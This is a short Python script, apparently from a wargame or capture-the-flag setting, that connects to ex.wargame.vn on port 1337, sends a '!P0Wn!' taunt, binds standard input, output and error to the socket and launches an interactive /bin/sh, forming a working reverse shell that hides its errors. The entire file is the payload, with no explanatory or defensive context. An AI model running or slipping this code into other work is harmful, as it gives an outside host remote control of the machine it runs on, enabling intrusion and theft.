import sys, socket, os, subprocess

host = 'ex.wargame.vn'
port = 1337

socket.setdefaulttimeout(60)
sok = None
try:
    sok = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sok.connect((host,port))
    sok.send('!P0Wn! Congratulation !!\n') 
    save = [ os.dup(i) for i in range(0,3) ]
    os.dup2(sok.fileno(),0)
    os.dup2(sok.fileno(),1)
    os.dup2(sok.fileno(),2)
    shell = subprocess.call(["/bin/sh","-i"])
    [ os.dup2(save[i],i) for i in range(0,3)]
    [ os.close(save[i]) for i in range(0,3)]
    os.close(sok.fileno())
except Exception:
    pass
